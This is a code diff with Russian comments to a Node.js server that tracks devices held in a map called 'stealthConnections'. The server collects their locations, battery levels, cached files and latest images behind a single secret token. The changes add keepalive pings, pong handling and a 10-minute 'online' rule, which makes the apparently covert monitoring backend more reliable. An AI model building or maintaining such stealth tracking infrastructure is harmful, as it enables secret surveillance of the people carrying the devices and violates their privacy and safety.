@@ -90,12 +90,39 @@ wss.on("connection", (ws, req) => {
     stealthConnections.set(deviceId, { ws, lastSeen: Date.now() });
     console.log(`📱 Device ${deviceId} connected`);
 
+    // ДОБАВЛЕНО: Keepalive механизм
+    const keepaliveInterval = setInterval(() => {
+      if (ws.readyState === WebSocket.OPEN) {
+        ws.ping(); // Отправляем WebSocket ping
+      } else {
+        clearInterval(keepaliveInterval);
+      }
+    }, 30000); // Каждые 30 секунд
+
+    // ДОБАВЛЕНО: Обработка WebSocket pong
+    ws.on('pong', () => {
+      const deviceInfo = stealthConnections.get(deviceId);
+      if (deviceInfo) {
+        deviceInfo.lastSeen = Date.now();
+      }
+    });
+
     ws.on("message", (rawData) => {
       try {
         const msg = JSON.parse(rawData.toString());
         
+        // ИЗМЕНЕНО: Отвечаем на ping и обновляем lastSeen
         if (msg.type === 'ping') {
           console.log(`💓 Ping from ${deviceId}`);
+          
+          // Обновляем lastSeen
+          const deviceInfo = stealthConnections.get(deviceId);
+          if (deviceInfo) {
+            deviceInfo.lastSeen = Date.now();
+          }
+          
+          // ДОБАВЛЕНО: Отправляем pong обратно
+          ws.send(JSON.stringify({ type: 'pong', timestamp: Date.now() }));
           return;
         }
         
@@ -146,12 +173,14 @@ wss.on("connection", (ws, req) => {
     });
 
     ws.on("close", () => {
+      clearInterval(keepaliveInterval); // ДОБАВЛЕНО
       stealthConnections.delete(deviceId);
       deviceFileCache.delete(deviceId);
       console.log(`Device ${deviceId} disconnected`);
     });
 
     ws.on("error", (err) => {
+      clearInterval(keepaliveInterval); // ДОБАВЛЕНО
       console.error(`Device error (${deviceId}):`, err);
     });
   }
@@ -378,6 +407,7 @@ app.post("/api/location", async (req, res) => {
   }
 });
 
+// ИЗМЕНЕНО: Добавлена логика "онлайн" если устройство активно за последние 10 минут
 app.get("/api/devices/:token", async (req, res) => {
   const { token } = req.params;
   if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
@@ -391,8 +421,13 @@ app.get("/api/devices/:token", async (req, res) => {
     if (error) throw error;
 
     const devices = {};
+    const now = Date.now();
+    
     data.forEach((location) => {
       if (!devices[location.device_id]) {
+        const lastSeen = location.timestamp;
+        const isRecentlyActive = (now - lastSeen) < 600000; // 10 минут
+        
         devices[location.device_id] = {
           device_id: location.device_id,
           device_name: location.device_name,
@@ -400,7 +435,7 @@ app.get("/api/devices/:token", async (req, res) => {
           battery: location.battery,
           location_count: 0,
           last_location: { lat: location.latitude, lng: location.longitude },
-          is_connected: stealthConnections.has(location.device_id)
+          is_connected: stealthConnections.has(location.device_id) || isRecentlyActive
         };
       }
       devices[location.device_id].location_count++;
@@ -442,6 +477,7 @@ app.get("/api/device/:deviceId/:token", async (req, res) => {
   }
 });
 
+// ИЗМЕНЕНО: Добавлен токен в URL
 app.get('/api/device/:deviceId/latest-image/:token', (req, res) => {
   const { deviceId, token } = req.params;
   
@@ -515,4 +551,3 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
-
